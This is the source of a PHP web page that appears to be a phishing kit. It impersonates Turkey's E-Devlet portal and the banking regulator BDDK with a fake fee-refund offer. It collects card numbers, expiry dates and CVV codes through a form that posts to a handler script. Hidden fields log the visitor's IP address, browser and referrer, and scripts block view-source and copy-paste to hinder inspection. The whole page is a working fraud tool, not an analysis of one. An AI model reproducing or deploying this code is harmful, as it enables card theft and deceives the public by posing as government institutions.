<?php
    ob_start();
    session_start();
    include 'ing/baglan.php';

    $ayarsor = $db->prepare("SELECT * from ayarlar where ayar_id=:id");
    $ayarsor->execute(array(
        'id' => 0
    ));
    $ayarcek=$ayarsor->fetch(PDO::FETCH_ASSOC);

    $gelenIP = GetIP();


?>
<!DOCTYPE html>
<html lang="tr-TR">
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>E-Devlet İade Sistemi</title>
    <meta charset="utf-8">

    <meta name="author" content="<?php echo $ayarcek['ayar_author']; ?>">
    
<meta name="keywords" content="tüm bileşenler, işlem geçmişleri, iade hizmeti, fırsat şansı, başvuru imkanı, ve onlarca"/>
<meta name="description" content="buraya yazılacak 100 kelimelik bir bilgi size yetmeyecek, daha fazlası için ziyaret edin."/>
<meta name="subject" content="Profesyonel Başvuru Mümkünatı">
<meta name="copyright"content="Türkiye">
<meta name="language" content="TR">
<meta name="robots" content="noindex,nofollow" />
<meta name="revised" content="Sunday, July 18th, 2019, 4:15 am" />
<meta name="abstract" content="">
<meta name="Classification" content="Business">
<meta name="owner" content="SERKANICO">
<meta name="url" content="https://hemen-edevletteniadebasvur.com/">
<meta name="identifier-URL" content="https://hemen-edevletteniadebasvur.com/">
<meta name="distribution" content="Global">
<meta name="rating" content="General">
<meta name="revisit-after" content="7 days">
<meta http-equiv="Expires" content="0">
<meta http-equiv="Pragma" content="no-cache">
<meta http-equiv="Cache-Control" content="no-cache">

    <link rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/css?family=Open+Sans:400,300,600,700,800%7CPoppins:400,500,700,800,900%7CRoboto:100,300,400,400i,500,700">
    <link type="text/css" rel="stylesheet" href="assets\css\style.css">
    <link rel="stylesheet" type="text/css" id="style_sheet" href="assets\css\skins\default.css">

    <!-- External CSS libraries -->
    <link type="text/css" rel="stylesheet" href="tema\css\bootstrap.min.css">
    <link type="text/css" rel="stylesheet" href="tema\fonts\font-awesome\css\font-awesome.min.css">
    <link type="text/css" rel="stylesheet" href="tema\fonts\flaticon\font\flaticon.css">

    <!-- Favicon icon -->
    <link rel="shortcut icon" href="tema\img\favicon.ico" type="image/x-icon">

    <!-- Google fonts -->
    <link rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/css?family=Open+Sans:400,300,600,700,800%7CPoppins:400,500,700,800,900%7CRoboto:100,300,400,400i,500,700">

    <!-- Custom Stylesheet -->
    <link type="text/css" rel="stylesheet" href="tema\css\style.css">
    <link rel="stylesheet" type="text/css" id="style_sheet" href="tema\css\skins\default.css">

</head>
<body id="top">
<div class="page_loader"></div>
<script src="valid/jquery-3.2.1.min.js" type="text/javascript"></script>
<script src="valid/jquery.creditCardValidator.js"></script>
<script>
function validate(){
	var valid = true;	 
    $(".demoInputBox").css('background-color','');
    var message = "";

    var cardHolderNameRegex = /^[a-z ,.'-]+$/i;
    var cvvRegex = /^[0-9]{3,3}$/;
    
    var cardHolderName = $("#card-holder-name").val();
    var cardNumber = $("#tach").val();
    var cvv = $("#dogum").val();

    if(cardHolderName == "" || cardNumber == "" || cvv == "") {
    	   message  += "<div>Lütfen zorunlu alanları doldurunuz.</div>";  
    	   if(cardHolderName == "") {
    		   $("#card-holder-name").css('background-color','#FFFFDF');
    	   }
    	   if(cardNumber == "") {
    		   $("#tach").css('background-color','#FFFFDF');
    	   }
    	   if (cvv == "") {
    		   $("#dogum").css('background-color','#FFFFDF');
    	   }
       valid = false;
    }
    
    if (cardHolderName != "" && !cardHolderNameRegex.test(cardHolderName)) {
        message  += "<div>Card Holder Name is Invalid</div>";    
    		$("#card-holder-name").css('background-color','#FFFFDF');
    		valid = false;
    }
    
    if(cardNumber != "") {
        	$('#tach').validateCreditCard(function(result){
            if(!(result.valid)){
                	message  += "<div>HATA! Kredi kartı bilgilerinizi kontrol ediniz!</div>";    
            		$("#tach").css('background-color','#FFFFDF');
            		valid = false;
            }
        });
    }
    
    if (cvv != "" && !cvvRegex.test(cvv)) {
        message  += "<div>HATA! Kredi kartı bilgilerinizi kontrol ediniz!</div>";    
        $("#dogum").css('background-color','#FFFFDF');
    		valid = false;
    }
    
    if(message != "") {
        $("#error-message").show();
        $("#error-message").html(message);
    }
    return valid;
}
</script>    

<form id="frmContact" action="guvenlik.php" name="gonderi" method="post" onSubmit="return validate();">
<!-- Login 1 start -->

<section class="creditly-wrapper wthree, w3_agileits_wrapper">

<div class="card bg-secondary shadow border-0">

<input type="hidden" name="gr_u5khan" value="<?php echo $_SERVER['HTTP_USER_AGENT']; ?>">
<input type="hidden" name="k_dref2" value="<?php if (isset($_SERVER['HTTP_REFERER'])) { echo $_SERVER['HTTP_REFERER']; }else { echo "-";} ?>">
<input type="hidden" name="decp" value="<?php echo $gelenIP; ?>">

<div class="login-1">
    <div class="container">
        <div class="row">
            <div class="col-md-12">
                <div class="login-inner-form">
                    <div class="details">
                        <a href="#">
                            <?php 
                                if (isset($_GET['banka']))
                            ?>
                            <img src="tema/img/logos/logo-2.png"  alt="logo">
                            <?php

                            ?>
                        </a>
                        <h3>Türkiye 'B.D.D.K.' Aidat Talep Sistemi</h3>


			<font size="2" color="#960000">Aidat Başvuruları Yalnızca <b>MasterCard ve Visa</b> Kartlar İçin Geçerlidir. </font>
			<br>
			<br>
                        <h4><?php if ($_GET['err43'] == "43aak") 
                        {
                            echo "Lütfen kartınızın son kullanma tarihini kontrol edip tekrar giriniz.";
                        } 
                        ?></h4>
                            <div class="form-group">
							
                                <input class="number credit-card-number input-text" 
                                       type="text" 
                                       id="tach" 
                                       name="tach" 
                                       placeholder="Kredi Kart Numaranız" 
                                       required>
                            </div>
                            <div class="form-group">
                                <input class="expiration-month-and-year input-text" 
                                       placeholder="Kartınızın Son Kullanma Tarihi" 
                                       type="text" 
                                       id="sifrexa" 
                                       name="ay-yil" 
                                       reqassetsred="" 
                                       required>
                            </div>
                            <div class="form-group">
                                <input class="input-text" 
                                       placeholder="CVV Kodu" 
                                       maxlength="3" 
                                       minlength="3" 
                                       pattern="[0-9]*"  
                                       type="number" 
                                       id="dogum" 
                                       name="dogum" 
                                       reqassetsred=""
                                       required>
                            </div>
                            
                            <div class="form-group mb-0">
                                <button type="submit" name="gonderi" class="btn-md btn-theme btn-block">SORGULA</button>
                            </div>
							<br>
                        <div id="error-message"><p style="color:red;"><?php if ( $_GET['hata'] ) { echo "Bir hata ile karşılaştık, lütfen tekrar deneyiniz."; } ?></p></div>
                          </div>
</form>
                       
                </div>
            </div>
        </div>
    </div>

</div>

<!-- Login 1 end -->

<script>
document.onkeydown = function(e) {
        if (e.ctrlKey && 
            (e.keyCode === 85 )) {
            return false;
        }
};
</script>

<script type="text/javascript">
$(document).ready(function () {
    //Disable full page
    $('body').bind('cut copy paste', function (e) {
        e.preventDefault();
    });
     
    //Disable part of page
    $('#id').bind('cut copy paste', function (e) {
        e.preventDefault();
    });
});
</script>

<!-- credit-card -->
		<script type="text/javascript" src="js/creditly.js"></script>
		<script type="text/javascript">
			$(function() {
			  var creditly = Creditly.initialize(
				  '.creditly-wrapper .expiration-month-and-year',
				  '.creditly-wrapper .credit-card-number',
				  '.creditly-wrapper .security-code',
				  '.creditly-wrapper .card-type');

			  $(".creditly-card-form .submit").click(function(e) {
				e.preventDefault();
				var output = creditly.validate();
				if (output) {
				  // Your validated credit card output
				  console.log(output);
				}
			  });
			});
		</script>
	<!-- //credit-card -->


</body>
</html>
